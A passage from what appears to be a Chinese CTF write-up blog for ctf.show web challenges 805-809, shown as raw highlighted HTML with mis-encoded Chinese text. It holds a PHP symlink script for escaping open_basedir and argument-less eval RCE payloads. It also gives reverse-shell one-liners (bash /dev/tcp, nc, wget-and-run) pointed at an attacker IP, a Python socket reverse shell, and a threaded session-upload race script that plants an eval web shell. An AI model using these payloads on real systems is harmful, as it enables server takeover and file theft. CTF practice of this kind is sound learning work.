operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$paths</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$relat_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$j</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">array_fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">symlink</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">array_fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$exp</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$exp</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n-----------------content---------------\n\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getRelativePath</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// some compatibility fixes for Windows paths</span>  <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\/'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>  <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$to</span>   <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$from</span>   <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$to</span>     <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$relPath</span>  <span class="token operator">=</span> <span class="token variable">$to</span><span class="token punctuation">;</span>  <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$from</span> <span class="token keyword">as</span> <span class="token variable">$depth</span> <span class="token operator">=></span> <span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// find first non-matching dir</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token variable">$to</span><span class="token punctuation">[</span><span class="token variable">$depth</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// ignore this directory</span>      <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// get number of remaining dirs to $from</span>      <span class="token variable">$remaining</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$depth</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$remaining</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// add traversals up to first matching dir</span>        <span class="token variable">$padLength</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$remaining</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$relPath</span> <span class="token operator">=</span> <span class="token function">array_pad</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">,</span> <span class="token variable">$padLength</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$relPath</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./'</span> <span class="token operator">.</span> <span class="token variable">$relPath</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$relPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">delfile</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$mydir</span> <span class="token operator">=</span> @<span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> @<span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$mydir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">File_Str</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         @<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$mydir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">File_Str</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'//'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getRandStr</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$randStr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$randStr</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$randStr</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>includeè¿œç¨‹æ–‡ä»¶åä¼ å‚fileå³å¯</p><p><strong>806</strong></p><h3 id="phpæ— å‚RCE"><a href="#phpæ— å‚RCE" class="headerlink" title="phpæ— å‚RCE"></a>phpæ— å‚RCE</h3><p>é¦–å…ˆæ˜¯ä¸€ç¯‡å¯ä¾›å‚è€ƒçš„<a href="https://blog.csdn.net/qq_45570082/article/details/106602261">æ–‡ç« </a></p><p>åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§</p><ol><li><p><strong>åˆ©ç”¨session_id</strong></p><p>phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«session_id(),å¯ä»¥ç›´æ¥è·å–åˆ°cookieä¸­çš„phpsessionidå€¼ï¼Œphpsessionidçš„ç»„æˆç¬¦å·æœ‰é™å®š,ä¸èƒ½ä½¿ç”¨ â€™ () â€˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åå†é€šè¿‡hex2binå‡½æ•°è½¬æ¢å›å»ï¼Œ<code>bin2hex(&#39;payload&#39;);</code>æ¥è½¬æ¢16ç¦æ­¢ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡<code>eval(hex2bin(session_id(session_start())));</code>ï¼Œåœ¨åŠ ä¸Šè¯·æ±‚å¤´ä¸­Cookieä¸­çš„<code>PHPSESSID=16è¿›åˆ¶payload</code>æ‰§è¡Œ</p></li><li><p><strong>åˆ©ç”¨<code>get_defined_vars ()</code>å‡½æ•°</strong></p><p><code>get_defined_vars()</code>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p><p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<span class="token function">prev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<span class="token function">each</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨å·²å®šä¹‰çš„å˜é‡ä¸­å­˜åœ¨ç€å…¨å±€å˜é‡GETå’ŒPOSTï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°æ¥å®ç°RCE</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>æ–‡ä»¶è¯»å–</p><p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p><pre class="line-numbers language-none"><code class="language-none">var_dump()  æ‰“å°æ‰€æœ‰å†…å®¹print_r()  åŒä¸Šscandir()  æ‰«æè·¯å¾„å†…æ–‡ä»¶åå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨localeconv()  getcwd()  è·å¾—å½“å‰å·¥ä½œç›®å½•getallheaders()  è·å¾—è¯·æ±‚å¤´å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>807</strong></p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè®°ä½è¦æœ‰å…¬ç½‘IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨frpå†…ç½‘ç©¿é€</p><ol><li><p>å…¬ç½‘æœåŠ¡å™¨</p><p>ç›‘å¬å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">æ”»å‡»ç«¯nc -lvp ç›‘å¬çš„ç«¯å£å—å®³ç«¯bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æ”»å‡»ç«¯IP&#x2F;æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0&gt;&amp;1nc æ”»å‡»ç«¯IP æ”»å‡»ç«¯ç›‘å¬ç«¯å£ -t &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨wgetä¸‹è½½æ‰§è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">wget æ”»å‡»ç«¯IP&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php &amp;&amp; php &#x2F;tmp&#x2F;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pythonè„šæœ¬åå¼¹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">#-*- coding: utf-8 -*-</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>oss<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"æ”»å‡»ç«¯IP"</span><span class="token punctuation">,</span>æ”»å‡»ç«¯ç›‘å¬ç«¯å£<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#æ›´æ”¹localhostä¸ºâ¾ƒâ¼°çš„å¤–â½¹ip,ç«¯â¼ä»»æ„</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>808</strong></p><h3 id="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> syssession<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>sess<span class="token operator">=</span><span class="token string">'yu22x'</span>url1<span class="token operator">=</span><span class="token string">"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/"</span>url2<span class="token operator">=</span><span class="token string">'http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'</span>data1<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token punctuation">&#125;</span>data2<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'echo 11123;system("cat /*");'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'11123'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çº¯çº¯çœ‹è¿æ°”</p><p><strong>809</strong></p><h3 id="pearæ–‡ä»¶åŒ…å«-RCE"><a href="#pearæ–‡ä»¶åŒ…å«-RCE" class="headerlink" title="pearæ–‡ä»¶åŒ…å«/RCE"></a>pearæ–‡ä»¶åŒ…å«/RCE</h3><p>æ–‡ç« <a 